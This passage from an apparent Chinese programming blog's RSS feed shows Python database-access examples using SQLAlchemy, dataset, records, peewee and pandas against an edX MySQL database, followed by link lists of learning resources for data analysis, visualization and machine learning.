&lt;span class="n"&gt;conn&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;engine&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;connect&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="c1"&gt;#连接成功&lt;/span&gt;
&lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;auth_user&amp;#39;&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;metadata&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;tables&lt;/span&gt; &lt;span class="c1"&gt;#true&lt;/span&gt;
&lt;span class="n"&gt;user_table&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Table&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;auth_user&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;metadata&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;autoload&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;True&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="c1"&gt;#metadata携带连接信息&lt;/span&gt;
&lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;name&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;c&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;user_table&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;columns&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="c1"&gt;#打印出字段名&lt;/span&gt;
&lt;span class="n"&gt;ins&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;user_table&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;insert&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="n"&gt;ins&lt;/span&gt; &lt;span class="c1"&gt;#查看编译的sql&lt;/span&gt;
&lt;span class="n"&gt;users&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;conn&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;execute&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;SELECT * FROM auth_user limit 5&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="c1"&gt;#直接执行sql&lt;/span&gt;

&lt;span class="n"&gt;s&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;sqlalchemy&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;select&lt;/span&gt;&lt;span class="p"&gt;([&lt;/span&gt;&lt;span class="n"&gt;user_table&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;参考：&lt;a href="https://segmentfault.com/a/1190000004288061"&gt;SQLAlchemy入门（一）&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;基于SQLAlchemy的便利工具&lt;/h2&gt;
&lt;h4&gt;&lt;a href="https://github.com/pudo/dataset"&gt;dataset&lt;/a&gt;&lt;/h4&gt;
&lt;blockquote&gt;
&lt;p&gt;In short, dataset makes reading and writing data in databases as simple as reading and writing JSON files.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;db&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;dataset&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;connect&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;mysql+mysqldb://root@edx_host/edxapp&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="c1"&gt;#print(db.tables)&lt;/span&gt;
&lt;span class="n"&gt;table&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;db&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;auth_user&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;span class="n"&gt;table&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;columns&lt;/span&gt;
&lt;span class="c1"&gt;#result = db.query&lt;/span&gt;
&lt;span class="c1"&gt;# 导出数据 dataset.freeze(result, format=&amp;#39;json&amp;#39;, filename=&amp;#39;users.json&amp;#39;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h4&gt;&lt;a href="https://github.com/kennethreitz/records"&gt;records&lt;/a&gt;&lt;/h4&gt;
&lt;blockquote&gt;
&lt;p&gt;SQL for Humans&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;易于导出到xls或是json。records 使用了 tablib 可以导出为任何格式&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;db&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;records&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Database&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;mysql+mysqldb://root@edx_host/edxapp&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;rows&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;db&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;query&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;select * from auth_user limit 5&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="n"&gt;rows&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;dataset&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h1&gt;&lt;a href="https://github.com/coleifer/peewee"&gt;peewee&lt;/a&gt;&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;a small, expressive orm -- supports postgresql, mysql and sqlite&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;使用习惯和django orm很像&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# http://docs.peewee-orm.com/en/latest/peewee/example.html&lt;/span&gt;

&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;peewee&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;datetime&lt;/span&gt;

&lt;span class="n"&gt;mysql_db&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;MySQLDatabase&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;yunfan&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;user&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;root&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;charset&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;utf8mb4&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="c1"&gt;#CREATE DATABASE `yunfan` DEFAULT CHARACTER SET utf8 COLLATE utf8_general_ci;  创建数据库使用utf-8 否则有编码问题&lt;/span&gt;

&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;QiniuStore&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Model&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="n"&gt;course_id&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;CharField&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;null&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="bp"&gt;True&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;username&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;CharField&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;default&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="c1"&gt;#key是关键字&lt;/span&gt;
    &lt;span class="n"&gt;file_key&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;CharField&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;default&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;filename&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;CharField&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;default&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;filesize&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;CharField&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;default&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;0&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="c1"&gt;#endUser = Column(String(100),nullable=True)&lt;/span&gt;
    &lt;span class="n"&gt;create_time&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;DateTimeField&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;default&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;datetime&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;datetime&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;now&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;Meta&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="n"&gt;database&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;mysql_db&lt;/span&gt;
        &lt;span class="n"&gt;order_by&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;-create_time&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,)&lt;/span&gt;


&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;__name__&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;__main__&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="n"&gt;mysql_db&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;connect&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
    &lt;span class="n"&gt;mysql_db&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;create_tables&lt;/span&gt;&lt;span class="p"&gt;([&lt;/span&gt;&lt;span class="n"&gt;QiniuStore&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h1&gt;pandas&lt;/h1&gt;
&lt;p&gt;pandas的DataFrame大多时候也用来容纳二维数据，像一张&lt;code&gt;表&lt;/code&gt;,所以易于与数据库打交道&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;#Pandas读取Mysql数据&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;pandas&lt;/span&gt; &lt;span class="kn"&gt;as&lt;/span&gt; &lt;span class="nn"&gt;pd&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;MySQLdb&lt;/span&gt;
&lt;span class="n"&gt;mysql_cn&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;MySQLdb&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;connect&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;host&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;127.0.0.1&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;port&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;3306&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;user&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;root&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;passwd&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;db&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;edxapp&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="c1"&gt;#df = pd.read_sql(&amp;#39;select * from auth_user limit 100;&amp;#39;, con=mysql_cn)  &lt;/span&gt;
&lt;span class="n"&gt;df&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;pd&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;read_sql&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;select * from auth_user limit 10;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;con&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;mysql_cn&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;mysql_cn&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;close&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Read SQL query into a DataFrame ,之后可以使用pandas的查询和绘图统计功能&lt;/p&gt;
&lt;p&gt;参考:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://blog.csdn.net/u011715678/article/details/48497291"&gt;利用Python 的 Pandas进行数据分析&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://pandas.pydata.org/pandas-docs/stable/comparison_with_sql.html"&gt;comparison_with_sql&lt;/a&gt;: pd与sql比较&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;心得&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;数据库的重点是表，操作可以用python方法，为了查询的灵活，还是需要sql&lt;/li&gt;
&lt;li&gt;用好ORM的前提是了解关系数据库的概念和典型用例&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;理解&lt;/h3&gt;
&lt;p&gt;数据库表是一个二维表，包含多行多列。把一个表的内容用Python的数据结构表示出来的话，可以用一个list表示多行，list的每一个元素是tuple，表示一行记录&lt;/p&gt;
&lt;p&gt;行，想象为二维数据(csv),外键是一种关系  &lt;/p&gt;
&lt;h3&gt;通用技能&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;多维数据的可视化 （降维）是一个常见的问题模式 。如何聚合，pandas部分&lt;/li&gt;
&lt;li&gt;帆船项目 帮助理解pandas如何用于web流&lt;ul&gt;
&lt;li&gt;如何实时读取sql，这样一来oricle问题就解决了 可视化问题&lt;/li&gt;
&lt;li&gt;从真实数据学习数据图表化的原理  《网站分析》&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;投资技能 pandas -&amp;gt; scikit-learn   &lt;/li&gt;
&lt;li&gt;edx的log先导入数据库  保留关系 然后变为扁平化数据  &lt;ul&gt;
&lt;li&gt;将log导入数据库是为了获得强大的查询能力  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;对sql的使用场景要有所了解  适合作什么&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;参考&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://zh.wikipedia.org/zh/SQLAlchemy"&gt;SQLAlchemy 维基百科&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.liaoxuefeng.com/wiki/001374738125095c955c1e6d8bb493182103fac9270762a000/0014021031294178f993c85204e4d1b81ab032070641ce5000"&gt;使用SQLAlchemy&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://forta.com/books/0672336073/"&gt;SQL必知必会 源码&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.jianshu.com/p/e6bba189fcbd"&gt;SQLAlchemy 简单笔记&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Tue, 03 May 2016 00:00:00 +0000</pubDate><guid>tag:,2016-05-03:relational-database-summary.html</guid><category>code</category></item><item><title>数据分析和可视化(我的学习资料)</title><link>/Data-analysis-and-visualization.html</link><description>&lt;p&gt;对数据分析和可视化这块一直兴趣满满，保持关注，搜集了一些不错的资料，整理分享给大家&lt;/p&gt;
&lt;p&gt;语言层面，我主要在关注Python和JavaScript，所以资料可能多与这两门语言有关&lt;/p&gt;
&lt;hr /&gt;
&lt;h1&gt;优秀文章(入门引导)&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://blog.jobbole.com/89674/"&gt;The Log：每个程序员都应该知道有关实时数据的统一抽象（1）概念&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.oschina.net/translate/log-what-every-software-engineer-should-know-about-real-time-datas-unifying"&gt;日志：每个软件工程师都应该知道的有关实时数据的统一概念&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://python.jobbole.com/80981/"&gt;数据科学的完整学习路径（Python版）&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://python.jobbole.com/81133/"&gt;Python数据分析入门&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://python.jobbole.com/80853/"&gt;Python和数据科学的起步指南&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;公共数据源&lt;/h1&gt;
&lt;p&gt;&lt;a href="https://github.com/caesar0301/awesome-public-datasets"&gt;awesome-public-datasets&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;其中我们可以看到香港公开的数据：&lt;a href="https://data.gov.hk/sc"&gt;data.gov.hk&lt;/a&gt;&lt;/p&gt;
&lt;h1&gt;Python&lt;/h1&gt;
&lt;h3&gt;ipython notebook&lt;/h3&gt;
&lt;p&gt;我喜欢使用ipython notebook（现在改名为jupyter）来探索数据，这是个值得一学的神器，可以看看我此前写的文章：&lt;a href="http://blog.just4fun.site/use-ipython-notebook.html"&gt;使用IPython Notebook来学习编程&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;使用ipython notebook来探索数据有许多好处，其中的一点是可以轻易分享经验和成果，现在有许多教程是基于它的：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/DrSkippy/Data-Science-45min-Intros"&gt;Data-Science-45min-Intros&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://nbviewer.jupyter.org/github/jrjohansson/scientific-python-lectures/tree/master/"&gt;scientific-python-lectures&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/donnemartin/data-science-ipython-notebooks"&gt;data-science-ipython-notebooks&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/donnemartin/interactive-coding-challenges"&gt;interactive-coding-challenges&lt;/a&gt;:这个主要是算法&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/cloga/scipy-lecture-notes_cn"&gt;Pytho科学计算生态的介绍的中文翻译&lt;/a&gt;-&lt;a href="https://github.com/cloga/scipy-lecture-notes_cn"&gt;github&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;&lt;a href="https://github.com/pydata/pandas"&gt;pandas&lt;/a&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/jvns/pandas-cookbook"&gt;pandas-cookbook&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="http://nbviewer.jupyter.org/github/jvns/pandas-cookbook/tree/master/cookbook/"&gt;http://nbviewer.jupyter.org/&lt;/a&gt;:从这里快速上手&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/wwj718/Zhihu_bigdata"&gt;Zhihu_bigdata&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;相关工具&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/robdmc/pandashells"&gt;pandashells&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/ipython/ipython/wiki/A-gallery-of-interesting-IPython-Notebooks#pandas-for-data-analysis"&gt;Pandas for data analysis&lt;/a&gt; :ipynb&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;JavaScript&lt;/h1&gt;
&lt;h3&gt;&lt;a href="https://github.com/mbostock/d3"&gt;d3&lt;/a&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/mbostock/d3/wiki/Gallery"&gt;案例展示&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.ourd3js.com/wordpress/?cat=2"&gt;D3 入门系列&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;一些建议：&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.zhihu.com/question/22171866"&gt;学习d3js有没有一个系统的学习方法&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.zhihu.com/question/38648735"&gt;如何评价 D3.js这个框架？&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.jianshu.com/p/c3800c61d2fb"&gt;D3.js入门指南&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;在线学习&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/datasciencemasters/go"&gt;The Open Source Data Science Masters&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.dataquest.io/"&gt;dataquest&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;博客&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/rushter/data-science-blogs"&gt;data-science-blogs&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;真实项目&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/rhiever/Data-Analysis-and-Machine-Learning-Projects"&gt;Data-Analysis-and-Machine-Learning-Projects&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;知乎问答&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.zhihu.com/question/29265587"&gt;如何快速成为数据分析师？&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;资料集&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/okulbilisim/awesome-datascience"&gt;awesome-datascience&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;一些好书&lt;/h1&gt;
&lt;h3&gt;数据挖掘概念&lt;/h3&gt;
&lt;p&gt;&lt;a href="http://book.douban.com/subject/5377669/"&gt;数据挖掘导论&lt;/a&gt;
&lt;a href="http://book.douban.com/subject/11542972/"&gt;数据挖掘:概念与技术&lt;/a&gt;&lt;/p&gt;
&lt;h3&gt;统计学&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://book.douban.com/subject/7056708/"&gt;深入浅出统计学&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://book.douban.com/subject/10590856/"&gt;统计学习方法&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Python&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://book.douban.com/subject/25779298/"&gt;利用Python进行数据分析&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;数据库&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://book.douban.com/subject/24250054/"&gt;SQL必知必会&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://book.douban.com/subject/3354490/"&gt;MySQL必知必会&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;机器学习&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://book.douban.com/subject/3288908/"&gt;集体智慧编程&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://book.douban.com/subject/24703171/"&gt;机器学习实战&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;其他入门好书&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://book.douban.com/subject/6862061/"&gt;计算机科学概论（第11版）&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://book.douban.com/subject/3040870/"&gt;Head First HTML与CSS、XHTML&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Tue, 16 Feb 2016 00:00:00 +0000</pubDate><guid>tag:,2016-02-16:Data-analysis-and-visualization.html</guid><category>dev-tools</category></item><item><title>机器学习与人工智能(我的学习资料)</title><link>/machine-leanring-and-ai.html</link><description>&lt;h1&gt;我的兴趣点(目前)&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;作诗机&lt;/li&gt;
&lt;li&gt;人工智能&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;策略&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;通过折腾来学习，先把它当做黑盒，关注输入和输出，使用增量法探索，同时阅读统计学和相关工具&lt;/li&gt;
&lt;li&gt;基于ipython notebook来探索&lt;/li&gt;
&lt;li&gt;coursera：&lt;a href="https://www.coursera.org/learn/machine-learning/"&gt;机器学习&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;统计学基础：《深入浅出统计学》&lt;/li&gt;
&lt;li&gt;《神经网络与深度学习讲义》（已粗看一遍）&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;入门文章&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://blog.jobbole.com/67616/"&gt;有趣的机器学习：最简明入门指南&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://blog.jobbole.com/50338/"&gt;如何向外行解释机器学习和数据挖掘&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.almosthuman.cn/2016/01/23/koarh/"&gt;神经网络和深度学习简史&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;学习路径&lt;/h1&gt;
&lt;ul&gt;
